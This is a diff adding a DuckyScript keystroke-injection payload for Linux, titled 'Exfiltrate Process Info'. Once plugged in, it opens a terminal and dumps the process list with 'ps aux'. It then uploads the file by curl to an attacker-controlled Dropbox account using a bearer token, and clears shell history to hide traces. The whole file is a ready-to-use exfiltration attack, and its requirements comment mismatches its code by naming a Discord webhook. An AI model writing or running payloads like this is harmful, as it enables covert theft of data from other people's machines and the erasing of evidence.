@@ -1,0 +1,42 @@
+REM ##########################################
+REM #                                        |
+REM # Title        : Exfiltrate Process Info |
+REM # Author       : Aleff                   |
+REM # Version      : 1.0                     |
+REM # Category     : Exfiltration            |
+REM # Target       : Linux                   |
+REM #                                        |
+REM ##########################################
+
+REM Requirements:
+REM     - Internet Connection
+REM     - Discord Webhook
+
+REM Required: Set here your Dropbox access TOKEN
+DEFINE #TOKEN example
+DEFINE #DROPBOX_FOLDER_NAME example
+DEFINE #DROPBOX_API_CONST https://content.dropboxapi.com/2/files/upload
+
+
+DEFAULT_DELAY 500
+CTRL ALT t
+DELAY 2000
+
+REM #### GET PROCESS SECTION ####
+STRINGLN ps aux > process.txt
+
+REM #### EXFILTRATE SECTION ####
+STRINGLN ACCESS_TOKEN="#TOKEN"
+STRINGLN USER_NAME=$(whoami)
+STRINGLN TXT_PATH="/home/$USER_NAME/process.txt"
+
+REM Set yout Dropbox folder name
+STRINGLN DROPBOX_FOLDER="/#DROPBOX_FOLDER_NAME"
+STRINGLN curl -X POST #DROPBOX_API_CONST --header "Authorization: Bearer $ACCESS_TOKEN" --header "Dropbox-API-Arg: {\"path\": \"$DROPBOX_FOLDER\",\"mode\": \"add\",\"autorename\": true,\"mute\": false}" --header "Content-Type: application/octet-stream" --data-binary "@$TXT_PATH"
+
+REM It depends by the internet connection, btw 1 or 2 seconds, generally, is sufficient
+DELAY 2000
+
+REM #### REMOVE TRACES ####
+STRINGLN history -c
+STRINGLN exit
